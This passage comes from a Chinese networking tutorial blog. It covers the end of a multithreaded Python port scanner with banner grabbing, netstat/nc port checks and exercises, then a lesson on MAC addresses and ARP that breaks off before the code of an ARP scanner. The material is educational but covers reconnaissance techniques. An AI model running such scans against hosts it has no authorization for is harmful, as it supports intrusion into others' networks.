class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n⏱️  扫描耗时: <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>f&#125;</span> 秒&quot;</span>)<br><br>    <span class="hljs-comment"># 安全提示</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚠️  安全提示:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - 仅扫描您有权限扫描的主机&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - 未经授权的端口扫描可能违法&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - 请遵守网络安全法律法规&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day11/day11_port_scanner.py<br></code></pre></td></tr></table></figure><h2 id="🔍-代码详解">🔍 代码详解</h2><h3 id="1-Socket连接测试">1. Socket连接测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># connect_ex() 方法</span><br>result = sock.connect_ex((host, port))<br><br><span class="hljs-comment"># 返回值：</span><br><span class="hljs-comment"># 0 = 连接成功（端口开放）</span><br><span class="hljs-comment"># 其他 = 连接失败（端口关闭或被过滤）</span><br></code></pre></td></tr></table></figure><h3 id="2-并发扫描提速">2. 并发扫描提速</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用线程池同时扫描多个端口</span><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># 100个线程并发工作</span><br>    futures = &#123;executor.submit(scan_port, host, port): port<br>               <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end)&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Banner抓取">3. Banner抓取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 连接成功后，尝试接收服务器的响应</span><br>sock.connect((host, port))<br>sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.0\r\n\r\n&#x27;</span>)  <span class="hljs-comment"># 发送HTTP请求</span><br>banner = sock.recv(<span class="hljs-number">1024</span>)  <span class="hljs-comment"># 接收响应</span><br><br><span class="hljs-comment"># Banner可以帮助识别服务类型和版本</span><br></code></pre></td></tr></table></figure><h2 id="🎓-知识小结">🎓 知识小结</h2><p>今天学习了：</p><ol><li>✅ 端口是传输层的概念，用于标识应用程序</li><li>✅ 端口号范围：0-65535</li><li>✅ Socket是网络编程的基础接口</li><li>✅ TCP Socket面向连接，UDP Socket无连接</li><li>✅ 端口扫描是网络安全审计的重要手段</li></ol><h3 id="重要概念">重要概念</h3><table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>端口</td><td>16位数字，标识应用程序</td></tr><tr><td>Socket</td><td>网络编程接口</td></tr><tr><td>TCP Socket</td><td>面向连接，可靠传输</td></tr><tr><td>UDP Socket</td><td>无连接，快速但不可靠</td></tr><tr><td>端口扫描</td><td>检测端口开放状态</td></tr></tbody></table><h3 id="常用命令">常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看本机监听的端口</span><br>netstat -an | grep LISTEN    <span class="hljs-comment"># Linux/Mac</span><br>netstat -an | findstr LISTEN <span class="hljs-comment"># Windows</span><br><br><span class="hljs-comment"># 查看特定端口</span><br>lsof -i :8080               <span class="hljs-comment"># Mac/Linux</span><br>netstat -ano | findstr :8080 <span class="hljs-comment"># Windows</span><br><br><span class="hljs-comment"># 测试端口连通性</span><br>telnet host port<br>nc -zv host port            <span class="hljs-comment"># Linux/Mac</span><br></code></pre></td></tr></table></figure><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：查看本机端口">练习1：查看本机端口</h3><ol><li>查看本机正在监听的所有端口</li><li>找出80和443端口的状态</li><li>查看哪些程序占用了端口</li></ol><h3 id="练习2：理解Socket">练习2：理解Socket</h3><ol><li>画出TCP Socket通信的完整流程</li><li>解释TCP三次握手在Socket中的体现</li><li>说明服务器端和客户端的区别</li></ol><h3 id="练习3：端口扫描">练习3：端口扫描</h3><ol><li>扫描本机的常用端口</li><li>扫描局域网网关的端口</li><li>分析扫描结果，识别运行的服务</li></ol><h3 id="练习4：代码扩展">练习4：代码扩展</h3><p>扩展端口扫描器：</p><ol><li>添加扫描结果保存功能</li><li>实现服务版本检测</li><li>添加操作系统指纹识别</li><li>支持多主机批量扫描</li></ol><h3 id="练习5：安全思考">练习5：安全思考</h3><ol><li>什么是端口扫描？合法吗？</li><li>如何防御端口扫描？</li><li>防火墙如何过滤端口？</li></ol><hr><p>💡 <strong>今日金句</strong>：端口是网络世界的大门，Socket是打开这扇门的钥匙！</p><p>👉 <a href="day10.md">上一天：MAC地址和ARP</a> | <a href="../../README.md">返回目录</a> | <a href="day12.md">下一天：DNS协议详解</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10天：MAC地址和ARP协议</title>
    <link href="/2025/11/10/10%E5%A4%A9%EF%BC%9AMAC%E5%9C%B0%E5%9D%80%E5%92%8CARP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/10%E5%A4%A9%EF%BC%9AMAC%E5%9C%B0%E5%9D%80%E5%92%8CARP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1>第10天：MAC地址和ARP协议</h1><blockquote><p>“IP地址是逻辑地址，MAC地址是物理地址。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解MAC地址的概念和格式</li><li>掌握MAC地址和IP地址的区别</li><li>理解ARP协议的工作原理</li><li>学会查看和管理ARP缓存</li><li>编写ARP扫描工具</li></ul><h2 id="🎯-什么是MAC地址？">🎯 什么是MAC地址？</h2><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">MAC地址 <span class="hljs-operator">=</span> 身份证号<br><br>身份证号：终身不变，唯一标识一个人<br>MAC地址：出厂固化，唯一标识一块网卡<br><br>IP地址 <span class="hljs-operator">=</span> 家庭住址<br><br>家庭住址：可以搬家更换<br>IP地址：可以更换网络而改变<br></code></pre></td></tr></table></figure><p><strong>MAC地址</strong>（Media Access Control Address，媒体访问控制地址）是网卡（网络接口卡）的物理地址，用于在数据链路层标识网络设备。</p><h3 id="MAC地址的特点">MAC地址的特点</h3><ol><li><strong>全球唯一</strong>：理论上世界上没有两块网卡有相同的MAC地址</li><li><strong>固化在硬件</strong>：出厂时写入ROM，一般不可更改</li><li><strong>48位（6字节）</strong>：通常用12位十六进制数表示</li><li><strong>数据链路层</strong>：工作在OSI模型的第2层</li></ol><h2 id="📊-MAC地址格式">📊 MAC地址格式</h2><h3 id="标准格式">标准格式</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby">常见表示方法：<br><br><span class="hljs-number">1</span>. 冒号分隔（<span class="hljs-title class_">Linux</span>/<span class="hljs-title class_">Unix</span>）<br>   <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:CC</span><span class="hljs-symbol">:DD</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:FF</span><br><br><span class="hljs-number">2</span>. 横线分隔（<span class="hljs-title class_">Windows</span>）<br>   <span class="hljs-variable constant_">AA</span>-<span class="hljs-variable constant_">BB</span>-<span class="hljs-variable constant_">CC</span>-<span class="hljs-variable constant_">DD</span>-<span class="hljs-variable constant_">EE</span>-<span class="hljs-variable constant_">FF</span><br><br><span class="hljs-number">3</span>. 点分隔（<span class="hljs-title class_">Cisco</span>）<br>   <span class="hljs-variable constant_">AABB</span>.<span class="hljs-variable constant_">CCDD</span>.<span class="hljs-variable constant_">EEFF</span><br><br><span class="hljs-number">4</span>. 连续（无分隔符）<br>   <span class="hljs-variable constant_">AABBCCDDEEFF</span><br><br>都是同一个<span class="hljs-variable constant_">MAC</span>地址！<br></code></pre></td></tr></table></figure><h3 id="MAC地址结构">MAC地址结构</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">MAC地址分为两部分：<br><br>┌─────────────────┬─────────────────┐<br>│  OUI (24位)     │  设备标识(24位) │<br>│  厂商标识       │  序列号         │<br>└─────────────────┴─────────────────┘<br>  AA:BB:CC         DD:EE:FF<br><br>OUI（Organizationally Unique Identifier）：<br><span class="hljs-bullet">-</span> 前3个字节（24位）<br><span class="hljs-bullet">-</span> IEEE分配给厂商的唯一标识<br><span class="hljs-bullet">-</span> 例如：<br><span class="hljs-bullet">  -</span> 00:50:56 → VMware虚拟网卡<br><span class="hljs-bullet">  -</span> 00:1C:42 → Parallels虚拟网卡<br><span class="hljs-bullet">  -</span> DC:A6:32 → Raspberry Pi<br><span class="hljs-bullet">  -</span> 3C:A9:F4 → 小米设备<br><br>设备标识：<br><span class="hljs-bullet">-</span> 后3个字节（24位）<br><span class="hljs-bullet">-</span> 厂商自行分配的序列号<br><span class="hljs-bullet">-</span> 理论上可产生 2^24 = 16,777,216 个地址<br></code></pre></td></tr></table></figure><h3 id="特殊MAC地址">特殊MAC地址</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>. 广播<span class="hljs-variable constant_">MAC</span>地址<br>   <span class="hljs-variable constant_">FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><br>   用于向局域网内所有设备发送数据<br><br><span class="hljs-number">2</span>. 组播<span class="hljs-variable constant_">MAC</span>地址<br>   第一个字节的最低位为<span class="hljs-number">1</span><br>   例如：<span class="hljs-number">01</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>5<span class="hljs-symbol">E:</span><span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span>（<span class="hljs-title class_">IPv4</span>组播）<br><br><span class="hljs-number">3</span>. 单播<span class="hljs-variable constant_">MAC</span>地址<br>   第一个字节的最低位为<span class="hljs-number">0</span><br>   普通的设备地址<br></code></pre></td></tr></table></figure><h2 id="🔍-MAC地址-vs-IP地址">🔍 MAC地址 vs IP地址</h2><h3 id="对比表">对比表</h3><table><thead><tr><th>特性</th><th>MAC地址</th><th>IP地址</th></tr></thead><tbody><tr><td>层次</td><td>数据链路层（第2层）</td><td>网络层（第3层）</td></tr><tr><td>长度</td><td>48位（6字节）</td><td>32位（IPv4）或128位（IPv6）</td></tr><tr><td>表示</td><td>十六进制</td><td>十进制（点分）</td></tr><tr><td>分配</td><td>厂商分配，固化在硬件</td><td>网络管理员或DHCP分配</td></tr><tr><td>唯一性</td><td>全球唯一</td><td>网络内唯一</td></tr><tr><td>可变性</td><td>理论上不可变</td><td>可以更换</td></tr><tr><td>作用范围</td><td>局域网内</td><td>可跨越多个网络</td></tr><tr><td>路由</td><td>不能路由</td><td>可以路由</td></tr></tbody></table><h3 id="为什么需要两个地址？">为什么需要两个地址？</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">类比：快递系统<br><br>MAC地址 = 楼层和房间号<br><span class="hljs-bullet">-</span> 在一栋楼内找到具体房间<br><span class="hljs-bullet">-</span> 只在本楼有效<br><span class="hljs-bullet">-</span> 固定不变<br><br>IP地址 = 城市和街道地址<br><span class="hljs-bullet">-</span> 跨城市寻找目标<br><span class="hljs-bullet">-</span> 可以搬家（更换网络）<br><span class="hljs-bullet">-</span> 可变<br><br>过程：<br><span class="hljs-bullet">1.</span> 快递先通过城市地址找到目标城市（IP路由）<br><span class="hljs-bullet">2.</span> 到达后通过楼层房间号找到具体位置（MAC寻址）<br></code></pre></td></tr></table></figure><h3 id="数据传输过程">数据传输过程</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">北京的电脑A → 上海的电脑<span class="hljs-keyword">B</span><br><br><span class="hljs-number">1</span>. 应用层：生成数据<br><span class="hljs-number">2</span>. 传输层：添加端口号<br><span class="hljs-number">3</span>. 网络层：添加<span class="hljs-built_in">IP</span>地址<br>   源<span class="hljs-built_in">IP</span>：北京A的<span class="hljs-built_in">IP</span><br>   目标<span class="hljs-built_in">IP</span>：上海B的<span class="hljs-built_in">IP</span><br><span class="hljs-number">4</span>. 数据链路层：添加MAC地址<br>   源MAC：当前路由器的MAC<br>   目标MAC：下一跳路由器的MAC<br><br>重点：<br>- <span class="hljs-built_in">IP</span>地址从头到尾不变（北京A → 上海B）<br>- MAC地址每一跳都会变化（每段链路使用不同的MAC）<br></code></pre></td></tr></table></figure><h2 id="📡-ARP协议">📡 ARP协议</h2><h3 id="什么是ARP？">什么是ARP？</h3><p><strong>ARP</strong>（Address Resolution Protocol，地址解析协议）用于将IP地址转换为MAC地址。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">问题：我知道目标的<span class="hljs-variable constant_">IP</span>地址，但要发送数据需要<span class="hljs-variable constant_">MAC</span>地址<br><br><span class="hljs-variable constant_">ARP</span>的作用：<br><span class="hljs-variable constant_">IP</span>地址（<span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>） → <span class="hljs-variable constant_">ARP</span>查询 → <span class="hljs-variable constant_">MAC</span>地址（<span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:CC</span><span class="hljs-symbol">:DD</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:FF</span>）<br></code></pre></td></tr></table></figure><h3 id="ARP工作原理">ARP工作原理</h3><h4 id="场景：主机A（192-168-1-10）要发送数据给主机B（192-168-1-20）">场景：主机A（192.168.1.10）要发送数据给主机B（192.168.1.20）</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ruby">步骤<span class="hljs-number">1</span>：检查<span class="hljs-variable constant_">ARP</span>缓存<br>主机A首先查看本地<span class="hljs-variable constant_">ARP</span>缓存表<br>- 如果有<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>的<span class="hljs-variable constant_">MAC</span>地址 → 直接使用<br>- 如果没有 → 发送<span class="hljs-variable constant_">ARP</span>请求<br><br>步骤<span class="hljs-number">2</span>：发送<span class="hljs-variable constant_">ARP</span>请求（广播）<br>主机A发送广播包：<br>┌─────────────────────────────────────┐<br>│ 谁是<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>？                  │<br>│ 请告诉<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span>                  │<br>│ 我的<span class="hljs-variable constant_">MAC</span>是<span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span>          │<br>└─────────────────────────────────────┘<br>目标<span class="hljs-variable constant_">MAC</span>：<span class="hljs-variable constant_">FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span>（广播）<br><br>步骤<span class="hljs-number">3</span>：所有主机接收<br>局域网内所有主机都收到这个广播包<br>- 主机B：这是问我的！<br>- 其他主机：不是问我的，丢弃<br><br>步骤<span class="hljs-number">4</span>：主机B发送<span class="hljs-variable constant_">ARP</span>响应（单播）<br>主机B回复：<br>┌─────────────────────────────────────┐<br>│ 我是<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>                    │<br>│ 我的<span class="hljs-variable constant_">MAC</span>是<span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span>          │<br>└─────────────────────────────────────┘<br>目标<span class="hljs-variable constant_">MAC</span>：<span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span>（单播给A）<br><br>步骤<span class="hljs-number">5</span>：主机A更新<span class="hljs-variable constant_">ARP</span>缓存<br>主机A记录：<br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span> → <span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><br><br>步骤<span class="hljs-number">6</span>：开始通信<br>现在主机A知道了主机B的<span class="hljs-variable constant_">MAC</span>地址，可以发送数据了<br></code></pre></td></tr></table></figure><h3 id="ARP报文格式">ARP报文格式</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ARP请求/响应报文：<br><br>┌────────────────────────────────────┐<br>│ 硬件类型（<span class="hljs-number">2</span>字节）                  │ <span class="hljs-number">1</span> <span class="hljs-operator">=</span> 以太网<br>├────────────────────────────────────┤<br>│ 协议类型（<span class="hljs-number">2</span>字节）                  │ <span class="hljs-number">0</span>x0800 <span class="hljs-operator">=</span> IP<br>├────────────────────────────────────┤<br>│ 硬件地址长度（<span class="hljs-number">1</span>字节）              │ <span class="hljs-number">6</span> <span class="hljs-operator">=</span> MAC地址<span class="hljs-number">6</span>字节<br>├────────────────────────────────────┤<br>│ 协议地址长度（<span class="hljs-number">1</span>字节）              │ <span class="hljs-number">4</span> <span class="hljs-operator">=</span> IP地址<span class="hljs-number">4</span>字节<br>├────────────────────────────────────┤<br>│ 操作码（<span class="hljs-number">2</span>字节）                    │ <span class="hljs-number">1</span><span class="hljs-operator">=</span>请求，<span class="hljs-number">2</span><span class="hljs-operator">=</span>响应<br>├────────────────────────────────────┤<br>│ 发送方MAC地址（<span class="hljs-number">6</span>字节）             │<br>├────────────────────────────────────┤<br>│ 发送方IP地址（<span class="hljs-number">4</span>字节）              │<br>├────────────────────────────────────┤<br>│ 目标MAC地址（<span class="hljs-number">6</span>字节）               │ 请求时为全<span class="hljs-number">0</span><br>├────────────────────────────────────┤<br>│ 目标IP地址（<span class="hljs-number">4</span>字节）                │<br>└────────────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="ARP缓存">ARP缓存</h3><p>为了提高效率，系统会缓存ARP解析的结果。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ARP缓存表示例：<br><br>IP地址           MAC地址              类型     过期时间<br><span class="hljs-number">192.168.1.1</span>     AA:BB:CC:DD:EE:FF    动态     <span class="hljs-number">120</span>秒<br><span class="hljs-number">192.168.1.20</span>    <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span>    动态     <span class="hljs-number">120</span>秒<br><span class="hljs-number">192.168.1.100</span>   FF:EE:DD:CC:BB:AA    静态     永久<br><br>类型：<br>- 动态：通过ARP协议自动学习，有过期时间<br>- 静态：手动配置，永久有效<br></code></pre></td></tr></table></figure><h3 id="查看ARP缓存">查看ARP缓存</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows</span><br>arp -a<br><br><span class="hljs-comment"># Linux/Mac</span><br>arp -n<br><br><span class="hljs-comment"># 查看特定IP的MAC</span><br>arp -n 192.168.1.1<br><br><span class="hljs-comment"># 清空ARP缓存（需要管理员权限）</span><br><span class="hljs-comment"># Windows</span><br>arp -d<br><br><span class="hljs-comment"># Linux</span><br><span class="hljs-built_in">sudo</span> ip -s -s neigh flush all<br><br><span class="hljs-comment"># Mac</span><br><span class="hljs-built_in">sudo</span> arp -d -a<br></code></pre></td></tr></table></figure><h2 id="🔧-实战项目：ARP扫描工具">🔧 实战项目：ARP扫描工具</h2><p>让我们编写一个ARP扫描工具，用于发现局域网内的所有设备！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span 